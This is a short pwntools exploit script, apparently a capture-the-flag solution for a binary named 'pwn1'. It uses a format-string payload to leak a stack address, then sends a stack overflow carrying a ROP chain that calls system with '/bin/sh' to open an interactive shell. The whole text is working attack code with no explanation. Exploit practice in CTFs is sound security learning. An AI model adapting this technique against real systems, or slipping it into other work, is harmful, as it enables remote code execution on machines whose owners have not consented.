from pwn import*
context(os='linux',arch='amd64',log_level='debug')

s = remote('',)
#s = process('./pwn1')
elf = ELF('./pwn1')

s.sendlineafter(b'Welcome to mimic world,try something\n', b'1')

s.recvuntil(b'You will find some tricks\n')

elf_base = int(s.recv(14),16) - 0x12a0
success('elf_base=>' + hex(elf_base))

binsh = elf_base + 0x4050
system = elf_base + elf.sym['system']
pop_rdi_ret = elf_base + 0x0000000000001943

sleep(0.1)
s.sendline(b'2')

payload = b'aaaaaaaa%36$p'
s.sendafter(b'hello\n',payload)

s.recvuntil(b'a'*8)

stack = int(s.recv(14),16)
success(hex(stack))

sleep(0.1)
payload = b'a'*0xe0 + p64(stack) + p64(stack-0x10) + p64(stack+0x140) + p64(pop_rdi_ret) + p64(binsh) + p64(pop_rdi_ret+1) + p64(system)
s.sendline(payload)

s.interactive()
